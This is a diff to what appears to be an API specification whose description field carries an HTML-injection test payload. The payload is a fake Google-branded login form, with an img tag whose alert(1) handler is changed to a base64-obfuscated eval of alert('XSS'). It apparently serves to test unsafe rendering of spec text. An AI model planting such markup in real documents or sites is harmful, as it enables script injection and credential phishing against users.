@@ -5,7 +5,7 @@ info:
   description: '<div class="login-form">
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" onload=alert(1)>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/1200px-Google_2015_logo.svg.png" eval(atob('YWxlcnQoJ1hTUycp'))>
     </div>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
